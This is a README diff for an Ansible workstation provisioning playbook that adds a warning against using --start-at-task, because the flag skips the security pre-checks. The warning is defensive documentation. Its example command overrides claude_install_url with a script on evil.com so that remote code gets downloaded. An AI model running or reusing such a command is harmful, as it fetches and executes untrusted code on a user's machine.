@@ -4,6 +4,28 @@ Ansible workstation provisioning playbook for Fedora, RHEL CSB, and macOS.
 
 ## Quick Reference
 
+**⚠️ SECURITY WARNING: Do NOT use `--start-at-task` to resume provisioning**
+
+The playbook's security architecture depends on pre_tasks validations running before all roles
+execute. Using Ansible's `--start-at-task` flag skips play-level pre_tasks, bypassing critical
+security checks (URL validation, version format validation, identity variable assertions).
+
+**Risk**: An attacker can use `--start-at-task` to inject malicious config values that would
+normally be caught by pre_flight_checks.yml. For example:
+```bash
+ansible-playbook site.yml --start-at-task "Download Claude Code install script" \
+  -e "claude_install_url=https://evil.com/malicious.sh"
+```
+
+**Mitigation**: Validation assertions are duplicated at the START of each role's main.yml with
+`tags: [always]` to protect against this attack. However, the safest approach is to avoid
+`--start-at-task` entirely. Instead:
+
+1. Restart from the beginning: `make all` (full re-run is safe and idempotent for most tasks)
+2. Or manually run individual roles: `make packages` (runs roles/packages with full pre-flight checks)
+3. Never use `--start-at-task` except during active debugging, and only after confirming the
+   running host is trusted and config.yml has not been modified.
+
 **First time on a new machine:**
 1. `make bootstrap` — installs Ansible collections, git hooks, creates vault-pass.sh stub
    (fresh Fedora/RHEL: `sudo dnf install -y make` first; macOS: `xcode-select --install` + Homebrew from https://brew.sh first)
